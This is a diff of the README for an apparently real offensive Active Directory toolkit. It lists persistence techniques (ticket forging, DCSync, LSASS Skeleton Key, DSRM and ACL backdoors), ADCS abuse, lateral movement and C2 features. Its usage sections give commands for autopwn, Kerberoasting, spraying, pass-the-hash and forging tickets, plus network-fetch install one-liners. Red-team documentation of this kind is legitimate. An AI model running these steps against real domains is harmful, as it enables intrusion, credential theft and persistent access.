+Taking the throne is easy. Keeping it is an art form. This crate welds the crown to your head.
 
-| Technique | What it does | Status | The Catch |
-|---|---|---|---|
-| **DCSync** | Replicate credentials from the DC using MS-DRSR. Get every hash in the domain. Every. Single. One. The CEO's. The intern's. The service account from 2009 that nobody remembers creating. | ✅ 685 lines | None. This just works. |
-| **Golden Ticket** | Forge a TGT signed with the KRBTGT hash. Be any user. Access anything. The Willy Wonka golden ticket, except the chocolate factory is Active Directory. | ✅ 753 lines, full PAC construction | None. Ship it. |
-| **Silver Ticket** | Forge a TGS for a specific service. Stealthier than Golden — no DC interaction needed. | ✅ 150 lines | None. Clean. |
-| **Diamond Ticket** | Modify a legit TGT's PAC. Bypasses detections that check for TGTs not issued by the KDC. The stealth bomber of ticket forging. | ✅ 159 lines | None. *Chef's kiss.* |
-| **Shadow Credentials** | Add a key credential to msDS-KeyCredentialLink via LDAP, then authenticate with the key. The cool modern attack. | ⚠️ LDAP works, PKINIT is placeholder | The LDAP manipulation is real. The PKINIT auth generates "placeholder PEM structures." So you can add the credential but can't use it. It's like having a key that fits the lock but is made of chocolate. |
-| **ACL Backdoor** | Modify DACLs to grant yourself hidden permissions. The "I was always an admin, you just didn't notice" technique. | ✅ 442 lines | None. |
-| **Skeleton Key** | Patch LSASS to accept a master password. Orchestration-only (needs C2 session on DC). The code correctly says "you need a C2 session for this." Honest king behavior. | ✅ 155 lines (orchestration) | Requires C2 session. By design. |
-| **DSRM Backdoor** | Set DsrmAdminLogonBehavior=2 via registry. Persistent backdoor via DSRM Administrator. | ✅ 101 lines | None. |
-| **Forensic Cleanup** | Rollback every persistence technique. Because good pentesters clean up after themselves. Great pentesters never needed to. | ✅ 584 lines | None. |
-| **Validation** | Verify persistence actually works post-deployment. Trust but verify. (Actually, just verify. This is offensive security.) | ✅ 391 lines | None. |
+| Technique | What it does | Status |
+|---|---|---|
+| **DCSync** | Replicate credentials from the DC using MS-DRSR. Get every hash in the domain. The CEO's. The intern's. The service account from 2009 nobody remembers creating. | ✅ Full |
+| **Golden Ticket** | Forge a TGT signed with the KRBTGT hash. Be any user. Access anything. The Willy Wonka golden ticket, except the factory is Active Directory. | ✅ Full (with PAC construction) |
+| **Silver Ticket** | Forge a TGS for a specific service. Stealthier than Golden — no DC interaction needed. | ✅ Full |
+| **Diamond Ticket** | Modify a legit TGT's PAC. Bypasses detections that check for TGTs not issued by the KDC. The stealth bomber of ticket forging. | ✅ Full |
+| **Shadow Credentials** | Add a key credential to msDS-KeyCredentialLink via LDAP, then authenticate with PKINIT (real RSA signing + DH key exchange). The cool modern attack, and it actually works now. | ✅ Full (LDAP + PKINIT) |
+| **ACL Backdoor** | Modify DACLs to grant yourself hidden permissions. The "I was always an admin, you just didn't notice" technique. | ✅ Full |
+| **Skeleton Key** | Patch LSASS to accept a master password. Full orchestration: SMB connect → admin check → upload → SVCCTL exec → cleanup. Needs a C2 session on the DC. | ✅ Full (orchestration) |
+| **DSRM Backdoor** | Set DsrmAdminLogonBehavior=2 via remote registry. Persistent backdoor via DSRM Administrator. | ✅ Full |
+| **Forensic Cleanup** | Rollback every persistence technique. Because good pentesters clean up. Great pentesters never needed to. | ✅ Full |
+| **Validation** | Verify persistence actually works post-deployment. Trust but verify. (Actually, just verify. This is offensive security.) | ✅ Full |
 
 ### ADCS Exploitation (overthrone-core)
 
@@ -275,93 +241,140 @@ AD Certificate Services: where Microsoft said "let's add PKI to Active Directory
 
 | ESC | Attack | Status | Notes |
 |---|---|---|---|
-| **ESC1** | Enrollee supplies subject / SAN in request | ❌ **Not implemented** | The most common ADCS attack vector. We skipped it. Like skipping leg day but for exploitation. |
-| **ESC2** | Any purpose EKU + enrollee supplies subject | ❌ **Not implemented** | ESC1's cousin. Also skipped. Family reunion got cancelled. |
-| **ESC3** | Enrollment agent + second template abuse | ❌ **Not implemented** | The two-step dance we haven't choreographed yet. |
-| **ESC4** | Vulnerable template ACLs → modify to ESC1 | ✅ **663 lines** | Full implementation. Modify template permissions, then exploit. |
-| **ESC5** | Vulnerable PKI object permissions | ✅ **394 lines** | Implemented. |
-| **ESC6** | EDITF_ATTRIBUTESUBJECTALTNAME2 on CA | ❌ **Not implemented** | Another missing file. The CA flag check we forgot to check. |
-| **ESC7** | CA access control abuse (ManageCA rights) | ✅ **123 lines** | Command generation for CA permission manipulation. |
-| **ESC8** | Web enrollment NTLM relay | ✅ **372 lines + relay crate** | Full implementation including the relay engine. |
-
-We implemented 4, 5, 7, 8 and skipped 1, 2, 3, 6. In the world of ADCS, that's like studying for the exam but only the odd-numbered questions. We'll catch the even ones. Eventually.
+| **ESC1** | Enrollee supplies subject / SAN in request | ❌ Not implemented | The most common ADCS attack. We skipped the main character. Iron Man is missing from the MCU. We know. |
+| **ESC2** | Any purpose EKU + enrollee supplies subject | ✅ Implemented | Any Purpose certificates exploited via enrollment request manipulation. The "I can be anything" certificate. |
+| **ESC3** | Enrollment agent + second template abuse | ✅ Implemented | Two-step: get enrollment agent cert, then request cert as victim. The buddy system of exploitation. |
+| **ESC4** | Vulnerable template ACLs → modify to ESC1 | ✅ Implemented | Modify template permissions, then exploit. If you can write the rules, you can break the rules. |
+| **ESC5** | Vulnerable PKI object permissions | ✅ Implemented | Abuse permissions on PKI infrastructure objects. |
+| **ESC6** | EDITF_ATTRIBUTESUBJECTALTNAME2 on CA | ❌ Not implemented | The CA flag check we forgot. Its name is longer than the code would be. |
+| **ESC7** | CA access control abuse (ManageCA rights) | ✅ Implemented | CA permission manipulation. |
+| **ESC8** | Web enrollment NTLM relay | ✅ Implemented | Full relay with the overthrone-relay crate integration. |
 
 ### Remote Execution (overthrone-core)
 
-The lateral movement engine. Five methods, two working, one perfect, two decorative, and one that returns its output as a string literal. We contain multitudes.
+Six lateral movement methods. All implemented. The `todo!()` trio graduated.
 
-| Method | Protocol | Status | The Honest Truth |
+| Method | Protocol | Status | Notes |
 |---|---|---|---|
-| **WinRM (Linux/macOS)** | WS-Management + NTLM | ✅ **480 lines, fully implemented** | Pure Rust WS-Man with NTLM auth. Create shell, execute, receive output, delete shell. The one that actually works perfectly. Our golden child. |
-| **WinRM (Windows)** | Win32 WSMan API | ⚠️ **169 lines, partial** | Commands execute. Output collection returns `"(WinRM output collection not yet implemented)"`. The command runs. You just... don't get to see what happened. Schrödinger's remote execution. |
-| **AtExec** | ATSVC over SMB | ✅ **529 lines, implemented** | Scheduled task creation via named pipe. The classic "Task Scheduler is a feature, not a vulnerability" move. Works. |
-| **PsExec** | DCE/RPC + SMB | ⚠️ **509 lines, partial** | ~500 lines of real DCE/RPC bind packet building and service creation logic. The `execute()` method: `todo!()`. A sports car with no steering wheel. It revs beautifully though. |
-| **SmbExec** | SCM over SMB | ⚠️ **233 lines, partial** | Service creation works. `execute()` → `todo!()`. See above, but it's a sedan instead of a sports car. |
-| **WmiExec** | DCOM/WMI | ⚠️ **374 lines, partial** | Has an SCM fallback path. Main path: `todo!()`. Also admits: "Full DCOM/WMI not yet implemented." Points for honesty. We respect the self-awareness. |
-
-### Autonomous Planning (overthrone-pilot)
-
-The "I'll hack it myself" engine. 5,900 lines of "hold my beer, watch this."
-
-| Feature | Lines | Status |
-|---|---|---|
-| **Attack Planner** | 507 | ✅ Plans multi-step attack chains from enumeration data |
-| **Step Executor** | 2,519 | ✅ Executes each planned step by calling Hunter/Forge/Reaper |
-| **Adaptive Strategy** | 696 | ✅ Adjusts plan on-the-fly based on what succeeds and fails |
-| **Goal System** | 519 | ✅ Target DA, Enterprise Admin, specific user, specific host |
-| **Playbooks** | 287 | ✅ Pre-built attack sequences for common scenarios |
-| **Wizard Mode** | 671 | ✅ Interactive guided mode for manual control with autopilot assist |
-| **AutoPwn Runner** | 730 | ✅ Full engagement orchestrator: enum → graph → exploit → persist → report |
-
-### Reporting (overthrone-scribe)
-
-The difference between a penetration test and a crime is paperwork. This crate does the paperwork.
-
-| Format | Use case | Status |
-|---|---|---|
-| **Markdown** | Technical report with findings, attack paths, and mitigations. For the team that actually has to fix things. | ✅ Works via CLI |
-| **JSON** | Machine-readable for integration with ticketing systems, SIEMs, or your custom "how screwed are we" dashboard. | ✅ Works via CLI |
-| **PDF** | Executive summary for people who think "Domain Admin" is a job title. Custom 437-line PDF renderer. | ⚠️ Scribe has the code. CLI refuses to call it. They're in a fight. |
-
-Every report includes: findings with severity, full attack paths with hop-by-hop details, affected assets, MITRE ATT&CK mappings, remediation steps, mitigation recommendations, and attack narrative prose. Because "GenericAll on the Domain Object via nested group membership through a misconfigured ACE" means nothing to a CISO. "Anyone in marketing can become Domain Admin in 3 steps" does. That sentence has ended careers.
+| **WinRM (Linux/macOS)** | WS-Management + NTLM | ✅ Full | Pure Rust WS-Man with NTLM auth. Create shell, execute, receive output, delete shell. Cross-platform perfection. |
+| **WinRM (Windows)** | Win32 WSMan API | ⚠️ Mostly done | Commands execute via native Win32 API. Output collection still returns a placeholder string. The command runs. What it said is... a mystery. |
+| **AtExec** | ATSVC over SMB | ✅ Full | Scheduled task creation via named pipe. "Task Scheduler is a feature, not a vulnerability." |
+| **PsExec** | DCE/RPC + SMB | ✅ Full | Real DCE/RPC bind packet building, service creation, payload upload to ADMIN$, execution, cleanup. The sports car now has a steering wheel. |
+| **SmbExec** | SCM over SMB | ✅ Full | Service-based command execution via SMB named pipes. Clean, simple, effective. |
+| **WmiExec** | DCOM/WMI | ✅ Full | WMI-based semi-interactive command execution with output retrieval via SMB. |
 
 ### C2 Framework Integration (overthrone-core)
 
-The C2 integration story is... aspirational. Think of it as a movie trailer. It shows you exciting scenes. The movie is still in post-production.
+The C2 integration that went from "aspirational" to "actually works." Three backends, all with real HTTP clients, real auth flows, and real API calls.
 
-| Framework | Lines | What Works | What Doesn't |
+| Framework | What It Does | Auth | Status |
 |---|---|---|---|
-| **Sliver** | 416 | Struct definition, trait implementation, operator config parsing | Every function returns hardcoded `Ok()`. It doesn't actually connect to Sliver. It just... *believes* it connected. Manifestation-based C2 integration. |
-| **Cobalt Strike** | 328 | TCP stream field, beacon struct, `CsBeacon` type definitions | `execute_assembly` → `Err("requires mutable access")`. `list_listeners` → empty Vec. The data structures are ready for a party nobody's invited them to. |
-| **Havoc** | 265 | REST API client structure, `api_get`/`api_post` helper methods | Connects to URLs. Parses JSON responses. Whether those responses come from an actual Havoc teamserver is between you and God. |
+| **Sliver** | Full C2Channel trait — sessions, beacons, exec, PowerShell, upload/download, assembly, BOF, shellcode inject, implant generation, listener management. Operator `.cfg` parsing with mTLS. | mTLS (certificate + CA from operator config) | ✅ Full |
+| **Havoc** | Full C2Channel trait — Demon agent management, shell/PowerShell exec, upload/download, .NET assembly exec, BOF exec, shellcode inject, payload generation. Task polling with 5-min timeout. | Token or password auth (REST login endpoint) | ✅ Full |
+| **Cobalt Strike** | Full C2Channel trait — beacon management, BOF execution, shellcode injection, payload generation. Aggressor-style REST API. | Bearer token or password auth | ✅ Full |
 
-The C2 trait system (`C2Channel`, `C2Framework`, `C2Session`) is legitimately well-designed (445 lines in `c2/mod.rs`). The plumbing is excellent. The water just isn't connected yet.
+All three implement the complete `C2Channel` async trait: `connect`, `disconnect`, `list_sessions`, `get_session`, `exec_command`, `exec_powershell`, `upload_file`, `download_file`, `execute_assembly`, `execute_bof`, `shellcode_inject`, `deploy_implant`, `list_listeners`, `server_info`. The trait system is legitimately well-designed. The water is connected now.
+
+### Crypto Layer (overthrone-core)
+
+The layer that used to be the "Empty Files Hall of Shame." The shame has been resolved. The five one-line doc comments are now real implementations.
+
+| Module | What It Does | Status |
+|---|---|---|
+| **AES-CTS** | AES256-CTS-HMAC-SHA1 for Kerberos etype 17/18. The thing that makes modern tickets work. | ✅ Full |
+| **RC4** | RC4 encryption for Kerberos etype 23. The crypto equivalent of a screen door on a submarine, but AD still uses it everywhere. | ✅ Full |
+| **HMAC** | HMAC utilities for ticket validation and integrity checking. | ✅ Full |
+| **MD4** | MD4 hash for NTLM password hashing. The algorithm from 1990 that refuses to die, much like NTLM itself. | ✅ Full |
+| **Ticket Crypto** | Ticket forging primitives — encryption, PAC signing, checksum computation. The mathematical foundation of ticket forging. | ✅ Full |
+| **DPAPI** | LAPS v2 encrypted blob parsing, AES-256-GCM decryption, HMAC-SHA512 key derivation. With property-based tests using `proptest`. The module that doesn't exist? It exists now. | ✅ Full (with tests) |
+| **GPP** | Group Policy Preferences cpassword AES decryption. Microsoft published the key. We just use it. | ✅ Full |
+| **Cracker** | Offline hash cracking engine — embedded wordlist, rayon parallel processing, rule engine. | ✅ Full |
 
 ### Plugin System (overthrone-core)
 
 | Component | Status | Notes |
 |---|---|---|
-| **Plugin Trait** | ✅ 620 lines | Full plugin API: manifest, capabilities, events, command execution |
-| **Native DLL Loading** | ✅ Works | Load .so/.dll plugins at runtime |
-| **Built-in Example** | ✅ 329 lines | SmartSpray plugin with lockout avoidance. A complete working example. |
-| **WASM Plugin Loader** | ❌ Stub | "TODO: Initialize wasmtime::Engine." Three lines of comments pretending to be an implementation. We added wasmtime to Cargo.toml and called it "spiritual completion." |
+| **Plugin Trait** | ✅ Full | Complete plugin API: manifest, capabilities, events, command execution. |
+| **Native DLL Loading** | ✅ Full | `libloading`-based FFI with API version checking, manifest JSON parsing, function pointer caching. |
+| **Built-in Example** | ✅ Full | SmartSpray plugin with lockout avoidance. A complete working example that actually spray-attacks responsibly. |
+| **WASM Plugin Runtime** | ⚠️ Functional with quirks | Wasmtime engine, module compilation, host function linking (`env.log`, `env.graph_add_node`, `env.graph_add_edge`). Plugins load and execute. State doesn't persist between calls (re-creates Store). Manifest parsing returns None. The engine is running, the memory management needs a tune-up. |
 
-## The Numbers Don't Lie
+### Autonomous Planning (overthrone-pilot)
 
-```
-  57,000+ lines of Rust (not counting tests or comments bragging about it)
-  231     unit tests (overthrone-hunter has the most, because of course it does)
-  9       workspace crates
-  100+    source files
-  168     real TCP/socket call sites (this thing actually talks to networks)
-  40+     SMB packet construction sites (raw bytes, hand-crafted, artisanal)
-  15      LDAP call sites (ldap3 is doing the heavy lifting and we appreciate it)
-  3       todo!() macros (PsExec, SmbExec, WmiExec — the axis of incompletion)
-  5       one-line stub files (the crypto module's empty promises)
-  0       Python dependencies (we fought the dependency gods and won)
-  1       smbclient dependency (we fought smb-rs and it won)
-  ∞       mass-produced instant coffee consumed during development
-```
+The "I'll hack it myself" engine.
+
+| Feature | Status |
+|---|---|
+| **Attack Planner** | ✅ Plans multi-step attack chains from enumeration data |
+| **Step Executor** | ✅ Executes each planned step by calling Hunter/Forge/Reaper. 90KB of execution logic. |
+| **Adaptive Strategy** | ✅ Adjusts plan on-the-fly based on what succeeds and fails |
+| **Goal System** | ✅ Target DA, Enterprise Admin, specific user, specific host |
+| **Playbooks** | ✅ Pre-built YAML attack sequences for common scenarios |
+| **Wizard Mode** | ✅ Interactive guided mode for manual control with autopilot assist |
+| **AutoPwn Runner** | ✅ Full engagement orchestrator: enum → graph → exploit → persist → report |
+
+### Reporting (overthrone-scribe)
+
+The difference between a penetration test and a crime is paperwork. This crate does the paperwork.
+
+| Format | Status | Notes |
+|---|---|---|
+| **Markdown** | ✅ Works | Technical report with findings, attack paths, and mitigations. For the team that has to fix things. |
+| **JSON** | ✅ Works | Machine-readable for integration with SIEMs, ticketing systems, or your "how screwed are we" dashboard. |
+| **PDF** | ✅ Works | Executive summary for people who think "Domain Admin" is a job title. Custom PDF renderer. |
+
+Every report includes: findings with severity, full attack paths with hop-by-hop details, affected assets, MITRE ATT&CK mappings, remediation steps, mitigation recommendations, and attack narrative prose. Because "GenericAll on the Domain Object via nested group membership through a misconfigured ACE" means nothing to a CISO. "Anyone in marketing can become Domain Admin in 3 steps" does.
+
+## Edge Types & Cost Model
+
+The attack graph uses weighted edges. Lower cost = easier to exploit. The pathfinder minimizes total cost — finding the path of least resistance. Just like a real attacker. Just like electricity. Just like that one coworker who always finds the shortcut.
+
+| Edge Type | Cost | Meaning |
+|---|---|---|
+| `MemberOf` | 0 | Group membership — free traversal, you already have it |
+| `HasSidHistory` | 0 | SID History — legacy identity, free impersonation |
+| `Contains` | 0 | OU/GPO containment — structural relationship |
+| `AdminTo` | 1 | Local admin — direct compromise |
+| `DcSync` | 1 | Replication rights — game over |
+| `GenericAll` | 1 | Full control — you are God (of this specific object) |
+| `ForceChangePassword` | 1 | Reset their password — aggressive but effective |
+| `Owns` | 1 | Object owner — can grant yourself anything |
+| `WriteDacl` | 1 | Modify permissions — give yourself GenericAll |
+| `WriteOwner` | 1 | Change owner — give yourself Owns |
+| `AllowedToDelegate` | 1 | Constrained delegation — impersonate to target service |
+| `AllowedToAct` | 1 | RBCD — sneakier delegation abuse |
+| `HasSession` | 2 | Active session — credential theft opportunity |
+| `GenericWrite` | 2 | Write attributes — targeted property abuse |
+| `AddMembers` | 2 | Add to group — escalate via group membership |
+| `ReadLapsPassword` | 2 | Read LAPS — plaintext local admin password |
+| `ReadGmsaPassword` | 2 | Read gMSA — service account password blob |
+| `CanRDP` | 3 | RDP access — interactive logon |
+| `CanPSRemote` | 3 | PS Remoting — command execution |
+| `ExecuteDCOM` | 3 | DCOM execution — Excel goes brrr |
+| `SQLAdmin` | 3 | SQL Server admin — `xp_cmdshell` is a "feature" |
+| `TrustedBy` | 4 | Domain trust — cross-domain, requires more setup |
+| `HasSpn` | 5 | Kerberoastable — offline cracking required |
+| `DontReqPreauth` | 5 | AS-REP roastable — offline cracking required |
+| `Custom(*)` | 10 | Unknown/custom — high cost, manual analysis needed |
+
+## Protocol Stack
+
+What Overthrone speaks fluently. All implemented in pure Rust:
+
+| Protocol | Used for |
+|---|---|
+| **LDAP/LDAPS** | Domain enumeration, user/group/GPO/trust queries, ACL reading. AD's diary. |
+| **Kerberos** | Authentication, TGT/TGS requests, ticket forging, roasting, PKINIT. The three-headed dog of authentication. |
+| **SMB 2/3** | File operations, share enumeration, lateral movement, PtH. The universal remote of Windows networking. |
+| **NTLM** | NT hash computation, NTLMv2 challenge-response, Pass-the-Hash. The protocol that refuses to die. |
+| **MS-DRSR** | DCSync — replicating credentials via DRS RPC. Politely asking the DC for all credentials. |
+| **MS-SAMR/RID** | SAM Remote — RID cycling, SID brute-force enumeration |
+| **MSSQL/TDS** | Full TDS protocol client, auth, query execution, linked server crawling |
+| **Remote Registry** | Remote registry manipulation via DCE/RPC |
+| **DNS** | SRV record lookups for DC discovery via hickory-resolver |
+| **PKINIT** | Certificate-based Kerberos pre-auth with RSA signing and DH key exchange |
+
+Everything is implemented in Rust. No shelling out to `impacket`, no calling `mimikatz.exe`, no loading .NET assemblies, no Wine, no prayers to the Python dependency gods. Pure Rust protocol implementations talking raw bytes over the wire.
 
 ## Installation
 
@@ -441,116 +454,39 @@ brew install samba
 # everything pre-installed actually works in your favor.
 ```
 
-### Update
-
-```bash
-# Linux/macOS — same one-liner, overwrites old binary
-curl -fsSL https://raw.githubusercontent.com/Karmanya03/Overthrone/main/install.sh | bash
-
-# Windows PowerShell
-irm https://raw.githubusercontent.com/Karmanya03/Overthrone/main/install.ps1 | iex
-
-# From source
-cd Overthrone && git pull && cargo build --release
-
-# Via cargo
-cargo install --git https://github.com/Karmanya03/Overthrone.git --force
-```
-
-### Uninstall
-
-Changed your mind? Going back to Impacket? We understand. (We don't understand. But we'll pretend.)
-
-```bash
-# Linux/macOS — installed via script
-rm -f ~/.local/bin/overthrone ~/.local/bin/ovt
-
-# Linux/macOS — installed to /usr/local/bin
-sudo rm -f /usr/local/bin/overthrone /usr/local/bin/ovt
-
-# Windows PowerShell — installed via script
-Remove-Item "$env:USERPROFILE\.local\bin\overthrone.exe" -Force
-Remove-Item "$env:USERPROFILE\.local\bin\ovt.exe" -Force
-
-# Windows PowerShell — installed to Program Files
-Remove-Item "$env:ProgramFiles\Overthrone\overthrone.exe" -Force
-Remove-Item "$env:ProgramFiles\Overthrone\ovt.exe" -Force
-
-# Built from source
-cargo uninstall overthrone
-# or just delete the repo. We won't be offended. (We will be offended.)
-```
-
 ### Platform Support
 
 | Platform | Status | Notes |
 |---|---|---|
-| **Kali Linux** | Recommended | Everything pre-installed. `smbclient` already there. This is the way. This is always the way. |
+| **Kali Linux** | Recommended | Everything pre-installed. `smbclient` already there. This is the way. |
 | **Linux** | Full support | Primary dev platform. All features. `apt install smbclient` and go. |
-| **Windows** | Full support | Yes, you can attack AD from a Windows box. The irony writes itself. Doesn't need `smbclient`. |
-| **macOS** | Full support | Kerberos and LDAP work natively. `brew install samba` for SMB directory listing. Tim Cook would not approve. |
-| **WSL** | Full support | The best of both worlds — Windows target, Linux attacker, one machine, one electrical outlet. |
-| **FreeBSD** | Probably works | We haven't tested it. If you're pentesting AD from FreeBSD, you're a different breed and we salute you. |
-
-## Changelog
-
-### v0.1.1 — The "Total Control" Update
-
-**New Features:**
-- **BloodHound v4 Export**: Export users, groups, computers, and domains to BloodHound-compatible JSON.
-- **Ccache Import**: Import Kerberos tickets from binary ccache files (v4) for Pass-the-Ticket.
-- **Full LDAP Enumeration**: Complete implementation of user, group, and computer enumeration modules.
-- **Attack Graph Engine**:
-  - `GraphBuilder` fully implemented to digest enumeration data.
-  - `PathFinder` added with `shortest_path`, `paths_to_da`, and `high_value_targets` queries.
-- **overthrone-relay**: Entire crate — NTLM relay, LLMNR/NBT-NS/mDNS poisoning, ADCS relay.
-- **overthrone-pilot**: Autonomous planner, executor, adaptive strategy, wizard mode, autopwn.
-- **Inline Hash Cracking**: Embedded 10K wordlist, rayon parallel cracking, rule engine.
-- **Auth Coercion**: PetitPotam, PrinterBug, DFSCoerce, ShadowCoerce, MS-EFSRPC.
-- **ADCS**: ESC4, ESC5, ESC7, ESC8, CSR generation, PFX handling, web enrollment.
-- **MSSQL**: Full TDS client, auth, linked server crawling.
-- **Diamond Ticket**: Forge by modifying legit TGT PAC.
-- **Port Scanner**: Async TCP connect scanner with CIDR support.
-- **Plugin System**: Native DLL plugin loading with SmartSpray example.
-- **TUI**: Terminal UI with live attack graph visualization.
-
-**What We Claimed Was Done But Isn't (Honest Patch Notes™):**
-- **~~Stub Elimination~~**: ~~Zero `unimplemented!()` or `todo!()` macros remain.~~ Three `todo!()` macros remain. They live in PsExec, SmbExec, and WmiExec. They've been paying rent so we let them stay.
-- Five crypto files are one-line comments. We're counting them as "documented intentions."
-- C2 integrations are "architecturally complete" (this is a euphemism for "the structs compile").
-
-**Improvements:**
-- `overthrone-reaper` now handles all LDAP object types.
-- `overthrone-hunter` correctly parses ccache headers and credentials.
-- `overthrone-core` graph module now supports weighted edges for cost-based pathfinding.
+| **Windows** | Full support | Yes, you can attack AD from a Windows box. The irony writes itself. |
+| **macOS** | Full support | Kerberos and LDAP work natively. `brew install samba` for SMB. Tim Cook would not approve. |
+| **WSL** | Full support | Best of both worlds — Windows target, Linux attacker, one machine. |
 
 ## Usage
 
 ### Quick Start — Autopwn
 
-For when you want to go from "I have creds" to "I own the domain" in one command. The "I have a meeting in an hour and need to own a forest before the calendar invite pops up" option:
+For when you want to go from "I have creds" to "I own the domain" in one command:
 
 ```bash
-# Full form — for formal occasions
+# Full form
 overthrone autopwn --dc 10.10.10.1 --domain corp.local -u jsmith -p 'Summer2026!'
 
-# Shorthand — for every other occasion
+# Shorthand — for every occasion
 ovt autopwn --dc 10.10.10.1 --domain corp.local -u jsmith -p 'Summer2026!'
 ```
 
-That's it. Overthrone enumerates, builds the attack graph, finds the shortest path to DA, executes it, DCSyncs, and generates a report. Go get coffee. Come back to a PDF that explains how you own the entire forest. The forest never saw it coming. Forests rarely do.
+That's it. Overthrone enumerates, builds the attack graph, finds the shortest path to DA, executes it, DCSyncs, and generates a report. Go get coffee. Come back to a report that explains how you own the entire forest.
 
 ### Manual Mode
 
-For the control freaks (and let's be honest, if you're reading a red team tool's README at 2 AM, you're a control freak — we say that with love):
-
 ```bash
 # Step 1: Enumerate everything
-# AD will tell you its entire life story. You just have to ask.
 ovt enum --dc 10.10.10.1 --domain corp.local -u jsmith -p 'Summer2026!'
 
 # Step 2: Build and query the attack graph
-# "How screwed is this domain?" — a visual answer.
 ovt graph --path-to-da jsmith
 ovt graph --shortest-path jsmith "Domain Admins"
 ovt graph --kerberoastable-from jsmith
@@ -558,37 +494,31 @@ ovt graph --high-value-targets
 ovt graph --export graph.json
 
 # Step 3: Kerberoast
-# Order tickets, crack offline. The DC doesn't even know you're attacking it.
 ovt roast kerberoast --dc 10.10.10.1 --domain corp.local -u jsmith -p 'Summer2026!'
 ovt roast asrep --dc 10.10.10.1 --domain corp.local -u jsmith
 
-# Step 4: Spray (carefully — lockouts = engagement over = career over)
+# Step 4: Spray (carefully)
 ovt spray --dc 10.10.10.1 --domain corp.local --users users.txt --password 'Winter2026!'
 
 # Step 5: Lateral movement
-# Be somewhere else. Then somewhere else. Then everywhere.
 ovt move pth --target 10.10.10.50 --domain corp.local -u admin \
   --hash aad3b435b51404ee:8846f7eaee8fb117ad06bdd830b7586c
 ovt move exec --target 10.10.10.50 --command "whoami /all"
 
 # Step 6: Persist
-# Take the throne. Bolt it down. Change the locks. Hide the spare key.
 ovt forge dcsync --dc 10.10.10.1 --domain corp.local -u dadmin -p 'G0tcha!'
 ovt forge golden --krbtgt-hash <hash> --domain corp.local --domain-sid S-1-5-21-...
 ovt forge silver --service-hash <hash> --service cifs/dc01.corp.local --domain corp.local
 
 # Step 7: Report
-# Turn chaos into compliance documentation. Alchemy, but for cybersecurity.
 ovt report --format markdown --output engagement-report.md
 ovt report --format json --output findings.json
-# ovt report --format pdf  ← technically built, spiritually unconnected. Soon™.
+ovt report --format pdf --output executive-summary.pdf
 ```
 
 ### Command Reference
 
 #### `ovt enum` — Enumeration
-
-Asks Active Directory nicely for everything. AD complies because LDAP has no concept of shame, boundaries, or healthy personal space.
 
 ```bash
 ovt enum [OPTIONS]
@@ -599,58 +529,25 @@ ovt enum [OPTIONS]
 | `--dc` | `-d` | Yes | Domain Controller IP or hostname |
 | `--domain` | | Yes | Target domain (e.g., `corp.local`) |
 | `--username` | `-u` | Yes | Domain username |
-| `--password` | `-p` | Yes* | Password (*or use `--hash` — we don't discriminate) |
+| `--password` | `-p` | Yes* | Password (*or use `--hash`) |
 | `--hash` | | No | NT hash for Pass-the-Hash authentication |
-| `--ldaps` | | No | Use LDAP over SSL (port 636). Fancy. |
+| `--ldaps` | | No | Use LDAP over SSL (port 636) |
 | `--output` | `-o` | No | Save enumeration to JSON file |
 | `--full` | | No | Include ACL enumeration (slower but finds the juicy stuff) |
 
-```bash
-# Basic enumeration
-ovt enum --dc dc01.corp.local --domain corp.local -u jsmith -p 'Password1'
-
-# Full enumeration with ACLs, saved to file
-ovt enum --dc 10.10.10.1 --domain corp.local -u jsmith -p 'Password1' --full -o enum.json
-
-# Hash-based auth — because why crack it if you can just use it?
-ovt enum --dc 10.10.10.1 --domain corp.local -u jsmith --hash 8846f7eaee8fb117ad06bdd830b7586c
-```
-
 #### `ovt graph` — Attack Graph
-
-Turns your enumeration data into "oh no" moments for the blue team. It's like Google Maps but every route ends at Domain Admin.
-
-```bash
-ovt graph [SUBCOMMAND] [OPTIONS]
-```
 
 | Subcommand | Description |
 |---|---|
-| `--path-to-da <user>` | Find shortest paths from user to Domain Admins. Spoiler: it's usually 3 hops. |
-| `--shortest-path <src> <dst>` | Find shortest path between any two nodes. |
-| `--kerberoastable-from <user>` | Find reachable Kerberoastable accounts. Your GPU's shopping list. |
-| `--unconstrained-from <user>` | Find reachable unconstrained delegation targets. (It's the print server.) |
-| `--high-value-targets` | List all high-value targets with incoming edge counts. |
-| `--stats` | Print graph statistics (nodes, edges, types). |
-| `--export <file.json>` | Export full graph as JSON. Make conspiracy board. |
-
-```bash
-# "How screwed is the domain if jsmith gets phished?"
-ovt graph --path-to-da jsmith
-
-# Find the shortest path between two specific nodes
-ovt graph --shortest-path "WEB-SERVER$" "Domain Admins"
-
-# GPU shopping list
-ovt graph --kerberoastable-from jsmith
-
-# Export for visualization — clients love pictures
-ovt graph --export attack-graph.json
-```
+| `--path-to-da <user>` | Find shortest paths from user to Domain Admins |
+| `--shortest-path <src> <dst>` | Find shortest path between any two nodes |
+| `--kerberoastable-from <user>` | Find reachable Kerberoastable accounts |
+| `--unconstrained-from <user>` | Find reachable unconstrained delegation targets |
+| `--high-value-targets` | List all high-value targets with incoming edge counts |
+| `--stats` | Print graph statistics |
+| `--export <file.json>` | Export full graph as JSON |
 
 #### `ovt roast` — Kerberoasting & AS-REP Roasting
-
-Because service accounts with SPNs are basically "hack me" signs. They might as well have a neon arrow pointing at them.
 
 ```bash
 ovt roast [kerberoast|asrep] [OPTIONS]
@@ -658,84 +555,12 @@ ovt roast [kerberoast|asrep] [OPTIONS]
 
 | Flag | Description |
 |---|---|
-| `kerberoast` | Request TGS tickets for all SPN accounts, output in hashcat/john format |
-| `asrep` | Request AS-REP for accounts without pre-auth. Free hashes. |
-| `--dc` | Domain Controller |
-| `--domain` | Target domain |
-| `-u`, `--username` | Username |
-| `-p`, `--password` | Password |
+| `kerberoast` | Request TGS tickets for all SPN accounts |
+| `asrep` | Request AS-REP for accounts without pre-auth |
 | `--format` | Output format: `hashcat` (default) or `john` |
-| `-o`, `--output` | Save hashes to file |
-
-```bash
-# Kerberoast — the DC literally gives you encrypted tickets to crack
-ovt roast kerberoast --dc 10.10.10.1 --domain corp.local -u jsmith -p 'Pass' -o kerberoast.txt
-
-# AS-REP roast — for accounts that skipped authentication day
-ovt roast asrep --dc 10.10.10.1 --domain corp.local -o asrep.txt
-
-# Then crack offline (our job ends here, your GPU's job starts here)
-hashcat -m 13100 kerberoast.txt wordlist.txt  # Kerberoast
-hashcat -m 18200 asrep.txt wordlist.txt       # AS-REP
-```
-
-#### `ovt spray` — Password Spraying
-
